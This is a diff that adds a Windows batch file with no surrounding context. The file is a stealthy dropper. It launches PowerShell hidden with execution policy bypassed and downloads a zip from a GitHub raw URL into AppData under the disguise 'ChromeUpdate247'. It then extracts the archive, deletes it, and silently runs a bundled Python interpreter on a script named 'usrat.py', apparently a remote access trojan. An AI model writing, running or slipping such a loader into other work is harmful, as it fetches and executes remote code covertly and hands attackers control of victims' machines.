@@ -1,0 +1,10 @@
+@echo off
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
+"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ^
+$zipPath = \"$env:USERPROFILE\AppData\Roaming\ChromeUpdate247.zip\"; ^
+$extractPath = \"$env:USERPROFILE\AppData\Roaming\ChromeUpdate247\"; ^
+(New-Object System.Net.WebClient).DownloadFile(\"https://github.com/f68g/us/raw/refs/heads/main/pyv2.zip\", $zipPath); ^
+Add-Type -AssemblyName System.IO.Compression.FileSystem; ^
+[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath); ^
+Remove-Item $zipPath -Force; ^
+Start-Process \"$extractPath\python.exe\" -ArgumentList \"$extractPath\usrat.py\" -WindowStyle Hidden"
